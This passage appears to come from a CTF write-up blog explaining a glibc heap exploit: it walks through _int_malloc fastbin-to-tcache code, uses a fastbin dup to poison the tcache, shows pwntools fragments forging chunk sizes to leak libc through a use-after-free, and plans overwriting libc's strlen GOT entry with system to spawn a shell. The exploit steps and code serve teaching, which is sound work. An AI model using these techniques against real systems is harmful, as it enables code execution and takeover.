</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="p">...</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="p">(</span><span class="n">nb</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="p">(</span><span class="nf">get_max_fast</span> <span class="p">()))</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="n">idx</span> <span class="o">=</span> <span class="nf">fastbin_index</span> <span class="p">(</span><span class="n">nb</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="n">mfastbinptr</span> <span class="o">*</span><span class="n">fb</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nf">fastbin</span> <span class="p">(</span><span class="n">av</span><span class="p">,</span> <span class="n">idx</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="n">mchunkptr</span> <span class="n">pp</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">victim</span> <span class="o">=</span> <span class="o">*</span><span class="n">fb</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="n">victim</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nf">__glibc_unlikely</span> <span class="p">(</span><span class="nf">misaligned_chunk</span> <span class="p">(</span><span class="n">victim</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl">          <span class="nf">malloc_printerr</span> <span class="p">(</span><span class="s">&#34;malloc(): unaligned fastbin chunk detected 2&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">SINGLE_THREAD_P</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">          <span class="o">*</span><span class="n">fb</span> <span class="o">=</span> <span class="nf">REVEAL_PTR</span> <span class="p">(</span><span class="n">victim</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span>
</span></span><span class="line"><span class="cl">          <span class="nf">REMOVE_FB</span> <span class="p">(</span><span class="n">fb</span><span class="p">,</span> <span class="n">pp</span><span class="p">,</span> <span class="n">victim</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nf">__glibc_likely</span> <span class="p">(</span><span class="n">victim</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">          <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="kt">size_t</span> <span class="n">victim_idx</span> <span class="o">=</span> <span class="nf">fastbin_index</span> <span class="p">(</span><span class="nf">chunksize</span> <span class="p">(</span><span class="n">victim</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nf">__builtin_expect</span> <span class="p">(</span><span class="n">victim_idx</span> <span class="o">!=</span> <span class="n">idx</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">            <span class="nf">malloc_printerr</span> <span class="p">(</span><span class="s">&#34;malloc(): memory corruption (fast)&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nf">check_remalloced_chunk</span> <span class="p">(</span><span class="n">av</span><span class="p">,</span> <span class="n">victim</span><span class="p">,</span> <span class="n">nb</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cp">#if USE_TCACHE
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>            <span class="cm">/* While we&#39;re here, if we see other chunks of the same size,
</span></span></span><span class="line"><span class="cl"><span class="cm">             stash them in the tcache.  */</span>
</span></span><span class="line"><span class="cl">            <span class="kt">size_t</span> <span class="n">tc_idx</span> <span class="o">=</span> <span class="nf">csize2tidx</span> <span class="p">(</span><span class="n">nb</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="n">tcache</span> <span class="o">&amp;&amp;</span> <span class="n">tc_idx</span> <span class="o">&lt;</span> <span class="n">mp_</span><span class="p">.</span><span class="n">tcache_bins</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="p">{</span>
</span></span><span class="line"><span class="cl">              <span class="n">mchunkptr</span> <span class="n">tc_victim</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">              <span class="cm">/* While bin not empty and tcache not full, copy chunks.  */</span>
</span></span><span class="line"><span class="cl">              <span class="k">while</span> <span class="p">(</span><span class="n">tcache</span><span class="o">-&gt;</span><span class="n">counts</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]</span> <span class="o">&lt;</span> <span class="n">mp_</span><span class="p">.</span><span class="n">tcache_count</span>
</span></span><span class="line"><span class="cl">                   <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">tc_victim</span> <span class="o">=</span> <span class="o">*</span><span class="n">fb</span><span class="p">)</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="p">{</span>
</span></span><span class="line"><span class="cl">                  <span class="k">if</span> <span class="p">(</span><span class="nf">__glibc_unlikely</span> <span class="p">(</span><span class="nf">misaligned_chunk</span> <span class="p">(</span><span class="n">tc_victim</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl">                  <span class="nf">malloc_printerr</span> <span class="p">(</span><span class="s">&#34;malloc(): unaligned fastbin chunk detected 3&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                  <span class="k">if</span> <span class="p">(</span><span class="n">SINGLE_THREAD_P</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                  <span class="o">*</span><span class="n">fb</span> <span class="o">=</span> <span class="nf">REVEAL_PTR</span> <span class="p">(</span><span class="n">tc_victim</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                  <span class="k">else</span>
</span></span><span class="line"><span class="cl">                  <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="nf">REMOVE_FB</span> <span class="p">(</span><span class="n">fb</span><span class="p">,</span> <span class="n">pp</span><span class="p">,</span> <span class="n">tc_victim</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                    <span class="k">if</span> <span class="p">(</span><span class="nf">__glibc_unlikely</span> <span class="p">(</span><span class="n">tc_victim</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">                      <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                  <span class="p">}</span>
</span></span><span class="line"><span class="cl">                  <span class="nf">tcache_put</span> <span class="p">(</span><span class="n">tc_victim</span><span class="p">,</span> <span class="n">tc_idx</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cp">#endif
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>            <span class="kt">void</span> <span class="o">*</span><span class="n">p</span> <span class="o">=</span> <span class="nf">chunk2mem</span> <span class="p">(</span><span class="n">victim</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nf">alloc_perturb</span> <span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">bytes</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">p</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">          <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">...</span>  
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>First, when we try to allocate a new <code>0x70</code> chunk, the <code>_int_malloc</code> will fetch the first pointer in the <code>fastbin</code> linked list, and later will use it as the allocated chunk.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">      <span class="n">idx</span> <span class="o">=</span> <span class="nf">fastbin_index</span> <span class="p">(</span><span class="n">nb</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="n">mfastbinptr</span> <span class="o">*</span><span class="n">fb</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nf">fastbin</span> <span class="p">(</span><span class="n">av</span><span class="p">,</span> <span class="n">idx</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="n">mchunkptr</span> <span class="n">pp</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">victim</span> <span class="o">=</span> <span class="o">*</span><span class="n">fb</span><span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now, this below code tells us that it will try to get the fastbin <code>fd</code> pointer and then try to iterate the linked list until either the <code>tcache</code> is full, or the <code>fd</code> pointer is <code>null</code>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="p">...</span>
</span></span><span class="line"><span class="cl">          <span class="o">*</span><span class="n">fb</span> <span class="o">=</span> <span class="nf">REVEAL_PTR</span> <span class="p">(</span><span class="n">victim</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">...</span>
</span></span><span class="line"><span class="cl">            <span class="cm">/* While we&#39;re here, if we see other chunks of the same size,
</span></span></span><span class="line"><span class="cl"><span class="cm">             stash them in the tcache.  */</span>
</span></span><span class="line"><span class="cl">            <span class="kt">size_t</span> <span class="n">tc_idx</span> <span class="o">=</span> <span class="nf">csize2tidx</span> <span class="p">(</span><span class="n">nb</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="n">tcache</span> <span class="o">&amp;&amp;</span> <span class="n">tc_idx</span> <span class="o">&lt;</span> <span class="n">mp_</span><span class="p">.</span><span class="n">tcache_bins</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="p">{</span>
</span></span><span class="line"><span class="cl">              <span class="n">mchunkptr</span> <span class="n">tc_victim</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">              <span class="cm">/* While bin not empty and tcache not full, copy chunks.  */</span>
</span></span><span class="line"><span class="cl">              <span class="k">while</span> <span class="p">(</span><span class="n">tcache</span><span class="o">-&gt;</span><span class="n">counts</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]</span> <span class="o">&lt;</span> <span class="n">mp_</span><span class="p">.</span><span class="n">tcache_count</span>
</span></span><span class="line"><span class="cl">                   <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">tc_victim</span> <span class="o">=</span> <span class="o">*</span><span class="n">fb</span><span class="p">)</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="p">{</span>
</span></span><span class="line"><span class="cl">                  <span class="k">if</span> <span class="p">(</span><span class="nf">__glibc_unlikely</span> <span class="p">(</span><span class="nf">misaligned_chunk</span> <span class="p">(</span><span class="n">tc_victim</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl">                  <span class="nf">malloc_printerr</span> <span class="p">(</span><span class="s">&#34;malloc(): unaligned fastbin chunk detected 3&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                  <span class="k">if</span> <span class="p">(</span><span class="n">SINGLE_THREAD_P</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                  <span class="o">*</span><span class="n">fb</span> <span class="o">=</span> <span class="nf">REVEAL_PTR</span> <span class="p">(</span><span class="n">tc_victim</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                  <span class="k">else</span>
</span></span><span class="line"><span class="cl">                  <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="nf">REMOVE_FB</span> <span class="p">(</span><span class="n">fb</span><span class="p">,</span> <span class="n">pp</span><span class="p">,</span> <span class="n">tc_victim</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                    <span class="k">if</span> <span class="p">(</span><span class="nf">__glibc_unlikely</span> <span class="p">(</span><span class="n">tc_victim</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">                      <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                  <span class="p">}</span>
</span></span><span class="line"><span class="cl">                  <span class="nf">tcache_put</span> <span class="p">(</span><span class="n">tc_victim</span><span class="p">,</span> <span class="n">tc_idx</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cp">#endif
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>            <span class="kt">void</span> <span class="o">*</span><span class="n">p</span> <span class="o">=</span> <span class="nf">chunk2mem</span> <span class="p">(</span><span class="n">victim</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nf">alloc_perturb</span> <span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">bytes</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">p</span><span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now, let&rsquo;s try to imagine the scenario that happened in our case due to the <code>fastbin dup</code> based on the above glibc code:</p>
<ul>
<li>First, let say that the current state of our <code>fastbin</code> is:
<ul>
<li><code>a-&gt;b-&gt;a</code>.</li>
</ul>
</li>
<li>When the <code>malloc</code> is called, the glibc will take the first pointer in the <code>fastbin</code> (which is <code>a</code>), and stored it in <code>victim</code> variable.</li>
<li>It also initialize a variable called <code>fb</code> which points to <code>a</code>.</li>
<li>Then, it will check whether <code>victim-&gt;fd</code> is null or not. Because <code>victim</code> is <code>a</code>, this means that it is not null (<code>a-&gt;fd</code> is <code>b</code>). Due to this, the glibc code will start moving the <code>fastbin</code> chunks to <code>tcache</code>. Below is the step-by-step that the glibc code did:
<ul>
<li>Get <code>fb-&gt;fd</code> (<code>fb</code> is <code>b</code>, so <code>fb-&gt;fd</code> is <code>a</code>) and stored it at <code>fb</code> (<code>fb=a</code>).</li>
<li>Move <code>b</code> to <code>tcache</code>
<ul>
<li>Now, <code>tcache[0x70] = b</code>, with <code>count = 1</code>.</li>
<li>And due to the move, <code>b-&gt;fd</code> will be cleared (<code>NULL</code>).</li>
</ul>
</li>
<li>Get <code>fb-&gt;fd</code> (<code>fb</code> is <code>a</code>, so <code>fb-&gt;fd</code> is <code>b</code> again due to the <code>fastbin dup</code> that we caused before).</li>
<li>Move <code>a</code> to <code>tcache</code>
<ul>
<li>Now, <code>tcache[0x70] = a-&gt; b</code>, with <code>count = 2</code>.</li>
<li>And due to the move, <code>a-&gt;fd</code> will be cleared (<code>NULL</code>).</li>
</ul>
</li>
<li>Get <code>fb-&gt;fd</code> (<code>fb</code> is <code>b</code>, so the result is <code>NULL</code> due to it has been cleared before by the glibc) and stored it at <code>fb</code> (<code>fb=NULL</code>).</li>
<li>Move <code>b</code> to <code>tcache</code> again.
<ul>
<li>Now, <code>tcache[0x70] = b -&gt; a -&gt; b</code>, with <code>count = 3</code>.</li>
<li>And due to the move, <code>b-&gt;fd</code> will be cleared (<code>NULL</code>).</li>
</ul>
</li>
<li>Now, because <code>fb</code> is <code>NULL</code>, the loop is stopped, and <code>malloc</code> will return <code>victim</code> (which is <code>a</code>).</li>
</ul>
</li>
<li>Remember that <code>a</code> is actually still part of the <code>tcache[0x70]</code>, so now we have overlapping chunk between an active chunk and <code>tcache</code> chunk.</li>
<li>This means, the value that we put during allocating this chunk will be used as the <code>tcache</code> pointer as well.</li>
<li>Before we fill the allocated chunk, the current <code>tcache</code> state is like <code>b-&gt;a-&gt;b</code>.</li>
<li>After we fill the allocated chunk, the <code>tcache</code> linked list will be changed to <code>b-&gt;a-&gt;&lt;our_controlled_value&gt;</code>.</li>
</ul>
<p>Based on the above scenario, we basically successfully poison the <code>tcache</code>, and the third allocation will be placed to any address that we set.</p>
<p>Back to our payload, what is <code>leaked_heap-0x6e80</code> (we will call it <code>target</code>) address? Why we use it to poison the last <code>tcache</code> item? The reason is because we want to allocate an overlapping chunk, and that address is located in the middle of a chunk.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">pwndbg&gt; x/50gx 0x5613ef239300-0x50
</span></span><span class="line"><span class="cl">0x5613ef2392b0:	0x0000000000000000	0x0000000000000071
</span></span><span class="line"><span class="cl">0x5613ef2392c0:	0x6161616161616161	0x6161616161616161
</span></span><span class="line"><span class="cl">0x5613ef2392d0:	0x6161616161616161	0x6161616161616161
</span></span><span class="line"><span class="cl">0x5613ef2392e0:	0x6161616161616161	0x6161616161616161
</span></span><span class="line"><span class="cl">0x5613ef2392f0:	0x0000000000000000	0x0000000000000031
</span></span><span class="line"><span class="cl">0x5613ef239300:	0x00000005613ef239	0x0000000000000000 &lt;- tcache last item that we set
</span></span><span class="line"><span class="cl">0x5613ef239310:	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x5613ef239320:	0x0000000000000000	0x0000000000000021
</span></span><span class="line"><span class="cl">0x5613ef239330:	0x00005613ef239350	0x0000000000000000
</span></span><span class="line"><span class="cl">0x5613ef239340:	0x0000000000000000	0x0000000000000071
</span></span><span class="line"><span class="cl">0x5613ef239350:	0x6161616161616161	0x6161616161616161
</span></span><span class="line"><span class="cl">0x5613ef239360:	0x6161616161616161	0x6161616161616161
</span></span><span class="line"><span class="cl">0x5613ef239370:	0x6161616161616161	0x6161616161616161
</span></span></code></pre></td></tr></table>
</div>
</div><p>If we allocate a new chunk to that position, we will be able to modify the size of the other chunks below it because with the ability of writing <code>0x64</code> data starting from that address, we can overwrite the adjacent <code>chunks</code> size.</p>
<p>This is how we will leak the libc address. We can change the overlapping <code>0x70</code> chunks size to <code>0x461</code> (or any size, as long as the <code>chunk_address+size</code> is pointing to other valid chunk), so that when we <code>destroy</code> the forged chunk, it will go to <code>unsorted bin</code>, and with the UAF bug, we can get a libc leak.</p>
<p>Another thing to notice is that the <code>target</code> reside on the <code>fake_chunk</code> that we create during emptying the <code>tcache</code> before, and I carefully craft the value to ensure that the <code>tcache</code> won&rsquo;t be corrupted. If you revisit the current <code>tcachebins</code>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">pwndbg&gt; bins
</span></span><span class="line"><span class="cl">tcachebins
</span></span><span class="line"><span class="cl">0x70 [  3]: 0x5613ef240190  0x5613ef240220  0x5613ef239300  0x0
</span></span></code></pre></td></tr></table>
</div>
</div><p>We can see that the last item is pointing to <code>0x0</code> address. This is because I specifically set the <code>target</code> value to mangled pointer of <code>0x0</code> address (which in this case <code>0x00000005613ef239</code>) during crafting the <code>fake_chunk</code> value.</p>
<p>Now, let&rsquo;s try to allocate this chunk and changes the below <code>0x70</code> chunk size to get a libc leak.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Use 2 tcache items</span>
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;b&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;c&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Allocate our fake chunk, where this will change the size of the</span>
</span></span><span class="line"><span class="cl"><span class="c1"># below chunk to 0x460</span>
</span></span><span class="line"><span class="cl"><span class="n">fake_chunk</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x20</span>
</span></span><span class="line"><span class="cl"><span class="n">fake_chunk</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">fake_chunk</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">leaked_heap</span><span class="o">-</span><span class="mh">0x6e30</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">fake_chunk</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x461</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">fake_chunk</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="n">fake_chunk</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Checking in the <code>gdb</code>, we can see that the below chunk size got overwritten to <code>0x461</code>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">pwndbg&gt; x/50gx 0x5613ef239300-0x50
</span></span><span class="line"><span class="cl">0x5613ef2392b0:	0x0000000000000000	0x0000000000000071
</span></span><span class="line"><span class="cl">0x5613ef2392c0:	0x6161616161616161	0x6161616161616161
</span></span><span class="line"><span class="cl">0x5613ef2392d0:	0x6161616161616161	0x6161616161616161
</span></span><span class="line"><span class="cl">0x5613ef2392e0:	0x6161616161616161	0x6161616161616161
</span></span><span class="line"><span class="cl">0x5613ef2392f0:	0x0000000000000000	0x0000000000000031
</span></span><span class="line"><span class="cl">0x5613ef239300:	0x6161616161616161	0x6161616161616161
</span></span><span class="line"><span class="cl">0x5613ef239310:	0x6161616161616161	0x6161616161616161
</span></span><span class="line"><span class="cl">0x5613ef239320:	0x0000000000000000	0x0000000000000021
</span></span><span class="line"><span class="cl">0x5613ef239330:	0x00005613ef239350	0x0000000000000000
</span></span><span class="line"><span class="cl">0x5613ef239340:	0x0000000000000000	0x0000000000000461
</span></span><span class="line"><span class="cl">0x5613ef239350:	0x0000000000000000	0x0000000000000000
</span></span><span class="line"><span class="cl">0x5613ef239360:	0x6161616100000000	0x6161616161616161
</span></span><span class="line"><span class="cl">0x5613ef239370:	0x6161616161616161	0x6161616161616161
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now, we only need to destroy this chunk, and with UAF, get the leaked libc address.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">destroy</span><span class="p">(</span><span class="n">neg</span><span class="p">(</span><span class="mi">205</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">out</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">view</span><span class="p">(</span><span class="mi">205</span><span class="p">)[:</span><span class="mi">6</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">leaked_libc</span> <span class="o">=</span> <span class="n">out</span>
</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">leaked_libc</span><span class="p">)</span> <span class="si">= }</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">leaked_libc</span> <span class="o">-</span> <span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;main_arena&#39;</span><span class="p">]</span><span class="o">+</span><span class="mi">96</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">)</span> <span class="si">= }</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>After this, we can move to the final stage, which is controlling the RIP value.</p>
<h4 id="stage-3-rip-control">Stage 3: RIP Control</h4>
<p>To recap, we now have:</p>
<ul>
<li>heap address</li>
<li>libc address</li>
</ul>
<p>Now, we need to get RIP Control, so that we can spawn a shell. Remember that with the previous <code>fastbin dup</code> trick, we actually can create a new <code>tcache</code> chunk in any position. So, for the final step, we only need to repeat the trick.</p>
<p>First, let&rsquo;s clean up the bins by allocating a lot of new chunks.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x120</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">add</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">*</span><span class="mi">4</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now, we repeat the same trick that we use before. But before that, what target should we aim to get RIP control?</p>
<p>During the competition, I decided to allocate a new <code>tcache</code> chunk at the <code>libc</code> GOT, so that I can overwrite the <code>strlen</code> libc GOT entry with <code>system</code>. I did this because we have <code>view</code> function, which will call <code>printf</code>, and based on observation in <code>gdb</code>, its internal call will call <code>strlen(chunk)</code>. So, if we able to overwrite <code>strlen</code> libc GOT entry with <code>system</code>, when we call <code>view</code> to a chunk which contained <code>/bin/sh</code> string, we will spawn a shell!</p>
<p>Let&rsquo;s start to redo our previous trick:</p>
<div class="highlight"><div class="chroma">
